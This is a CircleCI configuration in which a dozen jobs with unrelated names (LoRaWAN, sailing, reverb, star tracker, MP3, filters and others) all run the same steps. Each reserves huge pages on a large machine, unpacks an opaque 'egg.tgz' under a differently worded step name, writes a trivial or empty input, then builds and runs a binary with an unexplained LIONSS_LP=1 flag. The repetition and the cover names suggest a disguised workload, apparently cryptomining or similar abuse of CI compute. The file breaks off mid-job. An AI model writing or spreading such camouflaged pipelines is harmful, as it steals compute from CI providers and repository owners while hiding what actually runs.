version: 2.1

jobs:
  LorawanAdr:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set data rate
          command: |
            printf 'dr 3\n' > lora.cfg
      - run:
          name: Build LoRaWAN stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LorawanAdr -j2
      - run:
          name: Adapt data rate
          command: LIONSS_LP=1 ./build/LorawanAdr --conf lora.cfg --margin 10
  windward:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load polar
          command: |
            printf 'twa 45\n' > sail.cfg
      - run:
          name: Build routing engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target windward -j2
      - run:
          name: Optimize windward leg
          command: LIONSS_LP=1 ./build/windward --config sail.cfg --tacks 6
  renderGraph:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define passes
          command: |
            printf 'passes 10\n' > rg.cfg
      - run:
          name: Build frame graph
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target renderGraph -j2
      - run:
          name: Compile render graph
          command: LIONSS_LP=1 ./build/renderGraph --conf rg.cfg --alias-memory
  ReverbTail:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load impulse response
          command: |
            : > ir.wav
      - run:
          name: Build convolution engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ReverbTail -j2
      - run:
          name: Render reverb tail
          command: LIONSS_LP=1 ./build/ReverbTail --ir ir.wav --decay 2.5
  LsmTier3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Lay out tiers
          command: |
            mkdir -p lsm && : > lsm/tier3.run
      - run:
          name: Build tiered store
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LsmTier3 -j2
      - run:
          name: Merge tier-3 runs
          command: LIONSS_LP=1 ./build/LsmTier3 --dir lsm --tier 3
  star-tracker:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load catalog
          command: |
            printf 'stars 2000\n' > stars.cat
      - run:
          name: Build attitude sensor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target star-tracker -j2
      - run:
          name: Match star field
          command: LIONSS_LP=1 ./build/star-tracker --catalog stars.cat --fov 20
  duskfall:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set horizon
          command: |
            printf 'elevation -6\n' > dusk.cfg
      - run:
          name: Build sky model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target duskfall -j2
      - run:
          name: Render duskfall gradient
          command: LIONSS_LP=1 ./build/duskfall --config dusk.cfg --turbidity 3
  decal-atlas:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Pack decals
          command: |
            mkdir -p dec && : > dec/a.png
      - run:
          name: Build atlas packer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target decal-atlas -j2
      - run:
          name: Pack decal atlas
          command: LIONSS_LP=1 ./build/decal-atlas --dir dec --size 2048
  mp3_vbr:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load pcm
          command: |
            : > a.pcm
      - run:
          name: Build mp3 encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mp3_vbr -j2
      - run:
          name: Encode VBR stream
          command: LIONSS_LP=1 ./build/mp3_vbr --in a.pcm --quality 2
  biquad-lp:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set cutoff
          command: |
            printf 'fc=1000\nq=0.707\n' > filt.conf
      - run:
          name: Build IIR filter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target biquad-lp -j2
      - run:
          name: Design lowpass biquad
          command: LIONSS_LP=1 ./build/biquad-lp --conf filt.conf --fs 48000
  coap-observe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
